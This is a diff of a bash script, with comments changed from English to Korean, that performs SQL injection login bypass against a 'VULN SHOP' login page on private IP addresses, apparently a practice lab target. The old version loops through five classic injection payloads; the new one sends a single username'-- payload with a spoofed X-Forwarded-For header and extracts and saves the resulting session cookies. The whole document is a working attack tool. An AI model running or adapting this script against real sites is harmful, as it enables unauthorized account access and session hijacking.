@@ -1,36 +1,35 @@
 #!/bin/bash
-# SQL Injection Login Bypass Script
-# Target: VULN SHOP Login Page
+# SQL Injection 로그인 우회 스크립트
+# 사용법: ./sqli-login.sh [username]
 
-TARGET="http://10.210.136.53:3000"
+TARGET="http://192.168.0.28:3000"
 MY_IP="10.0.0.101"
+USERNAME="${1:-admin}"
 
-echo "[*] SQL Injection Login Bypass Test"
-echo "[*] Target: $TARGET/login"
+echo "[*] SQL Injection 로그인 우회 테스트"
+echo "[*] 타겟: $TARGET"
+echo "[*] 사용자: $USERNAME"
 echo ""
 
-# Test different SQL injection payloads
-payloads=(
-    "admin' OR '1'='1' --"
-    "admin'--"
-    "' OR 1=1--"
-    "admin' OR '1'='1"
-    "' OR ''='"
-)
+# SQL Injection 페이로드로 로그인
+RESPONSE=$(curl -s -v -X POST \
+    -H "X-Forwarded-For: $MY_IP" \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    -d "username=${USERNAME}'--&password=anything" \
+    "$TARGET/login" 2>&1)
 
-for payload in "${payloads[@]}"; do
-    echo "[*] Testing payload: $payload"
-    response=$(curl -s -i -X POST \
-        -H "X-Forwarded-For: $MY_IP" \
-        -H "Content-Type: application/x-www-form-urlencoded" \
-        -d "username=$payload&password=anything" \
-        "$TARGET/login" 2>&1)
+# 쿠키 추출
+if echo "$RESPONSE" | grep -q "Set-Cookie: user="; then
+    echo "[+] SQL Injection 성공!"
+    echo ""
+    echo "[*] 설정된 쿠키:"
+    echo "$RESPONSE" | grep "Set-Cookie:" | sed 's/< //'
+    echo ""
 
-    if echo "$response" | grep -q "Set-Cookie: user="; then
-        echo "[+] SUCCESS! Payload worked"
-        echo "$response" | grep "Set-Cookie"
-        echo ""
-    else
-        echo "[-] Failed"
-    fi
-done
+    # 쿠키 저장
+    COOKIES=$(echo "$RESPONSE" | grep "Set-Cookie:" | sed 's/< Set-Cookie: //' | cut -d';' -f1 | tr '\n' '; ')
+    echo "[*] 쿠키 문자열: $COOKIES"
+else
+    echo "[-] 로그인 실패"
+    echo "$RESPONSE" | tail -20
+fi
